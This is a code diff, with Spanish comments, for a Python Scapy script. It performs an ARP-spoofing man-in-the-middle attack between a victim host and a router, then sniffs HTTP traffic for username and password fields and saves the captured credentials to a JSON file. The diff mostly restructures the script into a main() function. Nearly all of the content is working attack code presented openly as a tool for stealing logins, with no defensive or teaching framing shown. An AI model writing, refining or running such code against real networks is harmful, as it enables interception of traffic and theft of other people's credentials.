@@ -8,8 +8,7 @@ import json
 # Para el caso de la lista se utiliza los patrones que pueden ser capturados por un sniffer para poder identificar una posible contraseña
 
 wordlist = ["username", "user", "userid", "usuario", "password", "pas"]
-
-#DEFINE UNA FUNCION QUE CAPTURA EL TRAFICO HTTP
+#DEFINE UNA FUNCIÓN QUE CAPTURA EL TRAFICO HTTP
 
 def capture_http(pkt):
     if pkt.haslayer(http.HTTPRequest): #Evalua si existe una solicitud de paquete http
@@ -23,7 +22,7 @@ def capture_http(pkt):
                         .lower()
                         .decode('utf-8'))
             except:
-                return None            
+                return None
             for word in wordlist:
                 if word in data:
                     #print("El tipo de dato para data es:\n", type(data))
@@ -33,24 +32,19 @@ def capture_http(pkt):
                     #print ("El valor que contiene la posición cero y uno, de la variable dataFormat, es:\n", dataFormat[:2])
                     userandpassword= dataFormat[:2]
                     #print("La lista con el usuario y la contraseña\nlo contiene la variable <userandpassword>\n",userandpassword)
-                    print ("POSIBLE USUARIO O PASSWORD: ", userandpassword)
-                    #print ("POSIBLE USUARIO O PASSWORD: " + data)
+                    #print("El valor de la posición cero userandpassword es:\n",userandpassword[0])
+                    #print("La tamaño de la lista <userandpassword> es:\n", len(userandpassword))
+                    #print("Esta es la última prueba:\n" + dataFormat[0] + "," + dataFormat[1] +"\n")
+                    #print("Esta es la última prueba:\n" + "".join(map(str, dataFormat[0])) + "," + "".join(map(str, dataFormat[1]))+"\n")
+                    print ("POSIBLE USUARIO Y PASSWORD: ", userandpassword)
                     with open('captura_paquetesKey.json', 'a') as archivo_paquetes:
                         #json.dump(data, archivo_paquetes, indent=4)
                         json.dump(userandpassword, archivo_paquetes, indent=4)
                         archivo_paquetes. close ()
-                        print ("****** Los paquetes fueron guardados en el archivo JSON correctamente *******")
+                        print ("****** Los paquetes fueron guardados en el archivo JSON <captura_paquetesKey.json> correctamente *******")
 
 
-# DEFINE UNA FUNCION QUE HABILITA EL FORWARDING PARA EL ATAQUE HOMBRE EN EL MEDIO
-
-
-#def enableForwarding():
-#    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-
-
-# define una funcion que optiene la mac addres de una interfaz
-
+# define una funcion que optiene la mac addres de una interfaz:
 
 def get_mac(ip):
     ip_layer = ARP(pdst=ip)
@@ -62,8 +56,7 @@ def get_mac(ip):
 
 
 
-# DEFINE UNA FUNCION PARA EL ATAQUE MITH DE TIPO ARP
-
+# DEFINE UNA FUNCION PARA EL ATAQUE MITH DE TIPO ARP:
 
 def spoofer (target, spoofed) :
     mac = get_mac (target)
@@ -73,14 +66,21 @@ def spoofer (target, spoofed) :
 
 
 
-# SE DEFINE LA FUNCION PRINCIPAL
+# SE DEFINE LA FUNCION PRINCIPAL:
 
+def main():
+    print ("====== Running Attack MITM ======")
+    try:
+        while True:
+            spoofer("192.168.1.19", "192.168.1.254") #ipvictima e Iprouter
+            spoofer("192.168.1.254", "192.168.1.19")
+            print("====== Sniffing Password Active | Capturanto paquetes HTTP ======")
+            sniff(iface="eth0",
+            store=False,
+            prn=capture_http) #iface es el nombre del grupo de red
 
-print ("****Running Attack MITM****")
-while True:
-    spoofer("192.168.1.19", "192.168.1.254") #ipvictima e Iprouter
-    spoofer("192.168.1.254", "192.168.1.19")
-    print("****Sniffing Password Active | Capturanto paquetes HTTP****")
-    sniff(iface="eth0",
-    store=False,
-    prn=capture_http) #iface es el nombre del grupo de red
+    except KeyboardInterrupt:
+        exit(0)
+
+if __name__ == "__main__":
+    main()
